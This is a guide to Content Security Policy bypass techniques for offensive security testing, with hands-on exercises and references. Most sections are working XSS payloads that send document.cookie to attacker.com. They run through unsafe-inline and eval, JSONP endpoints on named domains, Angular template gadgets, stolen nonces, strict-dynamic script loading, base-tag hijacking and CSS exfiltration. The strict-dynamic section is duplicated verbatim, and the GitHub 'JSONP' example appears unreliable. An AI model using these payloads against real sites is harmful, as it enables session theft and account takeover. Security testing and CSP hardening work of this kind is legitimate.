# Content Security Policy Bypass Techniques Guide

> Comprehensive guide to bypassing Content Security Policy (CSP) headers through nonce prediction, JSONP abuse, base tag injection, script gadget exploitation, and framework-specific template injection techniques.

## Introduction

Content Security Policy (CSP) is the most powerful client-side defense against Cross-Site Scripting. When properly configured, CSP can prevent inline script execution, restrict which domains can load JavaScript, and block dangerous eval-like constructs. However, CSP is a complex policy language with many directives and subtle interactions, and even small misconfigurations can render it completely ineffective.

This guide catalogs every known CSP bypass technique, organized by the specific CSP misconfiguration that enables each bypass. For each technique, we cover the theory of why the bypass works, practical exploitation steps, and detection methods. The guide assumes you already have an XSS injection point and need to bypass CSP to achieve code execution.

**CSP Bypass Workflow**: Before attempting any bypass, always analyze the target's CSP policy first. Use `curl -sI https://target.com | grep -i content-security-policy` to extract the header, then analyze it with Google CSP Evaluator (https://csp-evaluator.withgoogle.com/) to identify specific weaknesses.

## Practical Steps

### 1. Analyzing the Target CSP Policy

The first step in any CSP bypass is understanding what the policy allows and restricts. A systematic analysis of each directive reveals the attack surface.

```bash
# Extract and decode the CSP header
curl -sI https://target.com | grep -i content-security-policy

# Use csp-evaluator for automated analysis
npm install -g csp-evaluator
csp-evaluator "script-src 'self' https://cdn.example.com 'unsafe-inline'"

# Manual directive checklist:
# [ ] script-src: What script sources are allowed?
# [ ] style-src: What style sources are allowed?
# [ ] default-src: Fallback for unspecified directives?
# [ ] object-src: Can <object>/<embed> be used?
# [ ] base-uri: Is <base> tag restricted?
# [ ] form-action: Where can forms submit?
# [ ] frame-src: What frames can be loaded?
# [ ] worker-src: Service Worker restrictions?
```

### CSP Directive Risk Assessment

| Directive | If Missing/Weak | Bypass Risk |
|-----------|----------------|-------------|
| `script-src` | `*` or `unsafe-inline` | Direct script injection |
| `default-src` | Not set | Unspecified directives default to allowing anything |
| `object-src` | Not set or `none` missing | `<object>` tag for script execution |
| `base-uri` | Not set | `<base>` tag hijacking of script loads |
| `style-src` | `unsafe-inline` | CSS-based data exfiltration |
| `worker-src` | Not set | Service Worker persistence |
| `frame-src` | Permissive | iframe-based attacks |
| `connect-src` | Permissive | Data exfiltration via fetch/XHR |

### 2. Inline Script Bypass (unsafe-inline)

When `script-src` contains `'unsafe-inline'`, the CSP provides no protection against inline scripts. This is the most common and most severe misconfiguration. According to Google's research, over 90% of deployed CSP policies that include `unsafe-inline` provide zero effective protection against XSS.

```html
<!-- Direct inline script injection works without restriction -->
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<!-- Event handlers also work -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- javascript: URIs work -->
<a href="javascript:fetch('https://attacker.com/steal?c='+document.cookie)">click</a>

<!-- Even with unsafe-inline, nonces and hashes take precedence -->
<!-- If both unsafe-inline AND a nonce are present, only nonce scripts run -->
<!-- CSP Level 3 rule: 'unsafe-inline' is ignored when nonce or hash is present -->
```

**Impact**: `unsafe-inline` completely negates the purpose of CSP. If you find `unsafe-inline` in a CSP policy during testing, report it as a misconfiguration even if you cannot demonstrate a working XSS, because any future XSS discovery will be directly exploitable.

### 3. unsafe-eval Bypass

When `'unsafe-eval'` is present in `script-src`, attackers can use `eval()`, `Function()`, `setTimeout(string)`, and `setInterval(string)` to execute arbitrary JavaScript. Even if inline scripts are blocked, any existing script on the page can be leveraged.

```javascript
// If unsafe-eval is allowed, use eval from a script loaded via allowed source
eval('fetch("https://attacker.com/steal?c="+document.cookie)');

// Function constructor bypass
new Function('fetch("https://attacker.com/steal?c="+document.cookie)')();

// setTimeout/setInterval with string argument
setTimeout('fetch("https://attacker.com/steal?c="+document.cookie)', 0);
setInterval('fetch("https://attacker.com/steal?c="+document.cookie)', 100);

// String-based eval from DOM clobbering
[].constructor.constructor('fetch("https://attacker.com/steal?c="+document.cookie)')();
```

### 4. JSONP Endpoint Abuse

When `script-src` whitelists domains that host JSONP endpoints, attackers can use those endpoints to load arbitrary JavaScript. JSONP allows specifying a callback function name, which effectively becomes the executed code.

```html
<!-- Google JSONP bypass (if accounts.google.com is whitelisted) -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=fetch('https://attacker.com/steal?c='%2Bdocument.cookie)//">
</script>

<!-- Common whitelisted domains with exploitable JSONP endpoints -->
<!-- Google APIs -->
<script src="https://www.google.com/complete/search?client=chrome&q=test&callback=alert//"></script>

<!-- GitHub (if github.com is whitelisted) -->
<script src="https://github.com/login?return_to=javascript:alert(1)"></script>

<!-- CDN JSONP endpoints -->
<script src="https://cdn.jsdelivr.net/npm/evil-package@1.0.0/payload.js"></script>
```

### JSONP Endpoint Discovery

```bash
# Discover JSONP endpoints on whitelisted domains
# Check common JSONP parameter names
for param in callback cb func jsonp jsonpcall back; do
  curl -s "https://whitelisted-domain.com/api?${param}=TEST_CALLBACK" | grep "TEST_CALLBACK"
done

# Use waybackurls to find historical JSONP endpoints
echo "whitelisted-domain.com" | waybackurls | grep -i "callback=\|jsonp="

# Check if CDN allows arbitrary script hosting
# jsdelivr.net serves any npm package - check if attacker can publish malicious package
curl -s "https://cdn.jsdelivr.net/npm/package-name@version/file.js"
```

### 5. Base Tag Injection

When `base-uri` is not restricted in the CSP policy, attackers can inject a `<base>` tag to change the base URL for all relative URLs on the page. This hijacks script loads if the page uses relative paths.

```html
<!-- Inject base tag before script loads -->
<base href="https://attacker.com/">
<!-- Now <script src="/app.js"> loads from attacker.com/app.js -->

<!-- Practical exploitation when CSP has script-src 'self' -->
<!-- If the page loads scripts via relative paths: -->
<base href="https://attacker.com/">
<script src="/js/app.js"></script>
<!-- Attacker hosts /js/app.js with malicious content -->

<!-- Detection: check if base-uri is set -->
curl -sI https://target.com | grep -i "content-security-policy" | grep "base-uri"
```

### 6. Script Gadget Exploitation

Script gadgets are legitimate JavaScript code patterns in trusted scripts that can be repurposed to execute attacker-controlled code. When CSP blocks direct script injection, script gadgets in allowed libraries provide an alternative execution path.

```html
<!-- Angular.js script gadget (if angular.js is allowed in script-src) -->
<div ng-app ng-csp>
  {{$eval.constructor('fetch("https://attacker.com/steal?c="+document.cookie)')()}}
</div>

<!-- Angular with different trigger patterns -->
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>
<x ng-app>{{$eval.constructor('alert(1)')()}}</x>

<!-- jQuery script gadget (if jQuery is loaded) -->
<!-- jQuery selector injection -->
<script src="https://allowed-cdn.com/jquery.js"></script>
<!-- Then inject: -->
<div style="display:none">
  <img src=x onerror="alert(1)">
</div>

<!-- Bootstrap tooltip gadget -->
<div data-toggle="tooltip" data-html="true" title="<img src=x onerror=alert(1)>">
  Hover me
</div>

<!-- Vue.js template injection gadget -->
<!-- If Vue processes attacker-controlled HTML as template -->
<div v-html="userInput"></div>
<!-- Or in compiled templates -->
<div id="app">{{constructor.constructor('alert(1)')()}}</div>
```

### 7. Nonce and Hash Bypass

CSP nonces (`script-src 'nonce-abc123'`) and hashes (`script-src 'sha256-...'`) provide strong protection when correctly implemented. However, implementation flaws can make them bypassable.

```html
<!-- Nonce reuse across requests (should be per-request unique) -->
<!-- If the nonce is predictable or static, extract it from the page -->
<script>
  // Extract nonce from existing script tags
  const nonce = document.querySelector('script[nonce]').getAttribute('nonce');
  // Create new script with the stolen nonce
  const s = document.createElement('script');
  s.setAttribute('nonce', nonce);
  s.textContent = 'fetch("https://attacker.com/steal?c="+document.cookie)';
  document.body.appendChild(s);
</script>

<!-- Nonce in URL parameter (some frameworks expose nonce in page source) -->
<!-- Check: view-source:https://target.com for nonce values -->
<!-- If nonce is in a meta tag or comment, extract it -->

<!-- Hash bypass via script gadgets -->
<!-- If CSP allows scripts by hash, find an existing script whose hash is whitelisted -->
<!-- and exploit its functionality to execute attacker code -->
```

### 8. Strict-Dynamic Bypass

`strict-dynamic` allows scripts loaded by trusted scripts to inherit trust. This is designed to work with nonce-based CSP but can be exploited if a trusted script has gadget behavior. The `strict-dynamic` keyword is the recommended CSP Level 3 approach, but it introduces trust propagation that can be abused.

```javascript
// If a script with a valid nonce creates dynamic script elements,
// those new scripts inherit the trust from strict-dynamic
const s = document.createElement('script');
s.src = 'https://attacker.com/evil.js';
document.body.appendChild(s);  // Allowed by strict-dynamic

// Exploiting import() dynamic imports
import('https://attacker.com/module.js');

// Using trusted script to load untrusted code
// Find any script gadget in trusted code that creates script elements
```

**Key Insight**: With `strict-dynamic`, the CSP essentially trusts the entire JavaScript execution chain starting from the nonce-bearing script. Any vulnerability in trusted JavaScript (including third-party libraries) can propagate trust to attacker-controlled code. This is why script gadget research is critical for bypassing modern CSP implementations.

`strict-dynamic` allows scripts loaded by trusted scripts to inherit trust. This is designed to work with nonce-based CSP but can be exploited if a trusted script has gadget behavior.

```javascript
// If a script with a valid nonce creates dynamic script elements,
// those new scripts inherit the trust from strict-dynamic
const s = document.createElement('script');
s.src = 'https://attacker.com/evil.js';
document.body.appendChild(s);  // Allowed by strict-dynamic

// Exploiting import() dynamic imports
import('https://attacker.com/module.js');

// Using trusted script to load untrusted code
// Find any script gadget in trusted code that creates script elements
```

### 9. CSS Injection and Data Exfiltration

Even when script execution is fully blocked, CSP often allows `style-src 'unsafe-inline'` or permissive style sources. CSS injection can be used to exfiltrate page content character by character.

```css
/* Attribute selector-based data exfiltration */
/* Sends a request for each matching character in input[value] */
input[value^="a"] { background: url("https://attacker.com/exfil?char=a&pos=0"); }
input[value^="b"] { background: url("https://attacker.com/exfil?char=b&pos=0"); }
/* ... repeat for all characters */

/* Advanced: use CSS animations to probe multiple characters */
@keyframes exfil {
  0% { background: url("https://attacker.com/exfil?c=a"); }
  1% { background: url("https://attacker.com/exfil?c=b"); }
  /* ... */
}
input[value^="s"][value*="e"] {
  animation: exfil 10s;
}
```

### 10. iframe and Frame Bypass

When `frame-src` or `child-src` is permissive, attackers can load malicious content in iframes that bypass the parent's CSP.

```html
<!-- If frame-src allows attacker-controlled domains -->
<iframe src="https://attacker.com/evil-page.html"></iframe>

<!-- If frame-src allows data: URIs -->
<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>

<!-- If frame-src allows blob: URIs -->
<script>
  const blob = new Blob(['<script>alert(document.domain)<\/script>'], {type: 'text/html'});
  const url = URL.createObjectURL(blob);
  document.write('<iframe src="' + url + '"></iframe>');
</script>

<!-- postMessage from iframe to parent -->
<iframe src="https://attacker.com/" onload="this.contentWindow.postMessage('xss','*')">
```

## Hands-on Exercises

### Exercise 1: CSP Policy Analysis and Bypass

**Objective**: Analyze a target's CSP policy, identify weaknesses, and construct a working bypass.

1. Deploy a locally vulnerable application with a weak CSP policy
2. Extract the CSP header and analyze each directive
3. Identify the weakest directive (usually `script-src`)
4. Based on the weakness, select the appropriate bypass technique from this guide
5. Construct and test the bypass payload
6. Document the complete bypass chain from analysis to execution

### Exercise 2: JSONP Endpoint Discovery Lab

**Objective**: Find and exploit JSONP endpoints on CSP-whitelisted domains.

1. Deploy an application that whitelists `www.google.com` in `script-src`
2. Enumerate JSONP endpoints on the whitelisted domain
3. Construct a payload that uses the JSONP callback to execute arbitrary JavaScript
4. Test the payload against the application's CSP
5. Write a report explaining why JSONP endpoints undermine CSP script whitelisting

### Exercise 3: Angular Script Gadget Exploitation

**Objective**: Bypass a strict CSP using Angular.js template injection as a script gadget.

1. Deploy a page with CSP: `script-src 'self' https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js`
2. Confirm that inline scripts are blocked by the CSP
3. Inject Angular template syntax: `{{$eval.constructor('alert(1)')()}}`
4. Observe that the Angular script gadget executes the code despite the CSP
5. Explain why script gadgets undermine domain whitelisting in CSP

### Exercise 4: Base Tag Hijacking

**Objective**: Demonstrate how missing `base-uri` in CSP enables script load hijacking.

1. Deploy a page with CSP that restricts `script-src 'self'` but omits `base-uri`
2. Confirm the page loads scripts via relative paths (e.g., `<script src="/js/app.js">`)
3. Inject a `<base>` tag pointing to your attacker-controlled server
4. Host the expected script path on your server with malicious content
5. Verify that the page loads and executes your malicious script
6. Add `base-uri 'self'` to the CSP and confirm the attack is now blocked

## References

- **Google CSP Evaluator**: https://csp-evaluator.withgoogle.com/ -- Essential tool for analyzing CSP policies and identifying weaknesses automatically.
- **PortSwigger CSP Bypass Labs**: https://portswigger.net/web-security/cross-site-scripting/content-security-policy -- Hands-on labs for practicing CSP bypass techniques.
- **CSP Is Dead, Long Live CSP (Research Paper)**: https://research.google/pubs/pub45542/ -- Google research paper on CSP bypass techniques through script gadgets.
- **CSP Level 3 Specification**: https://www.w3.org/TR/CSP3/ -- The official W3C specification for understanding directive behavior and interactions.
- **OWASP CSP Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html -- Defense-focused guidance on proper CSP configuration.
- **Mario Heiderich CSP Research**: https://research.securitum.com/ -- Advanced research on CSP bypasses including mutation XSS and parser differentials.
- ** Cure53 CSP Audit Reports**: https://cure53.de/ -- Security audit reports that often include CSP misconfiguration findings.
- **HTML5 Security CheatSheet**: https://html5sec.org/ -- Comprehensive reference for HTML5-specific attack vectors that interact with CSP.
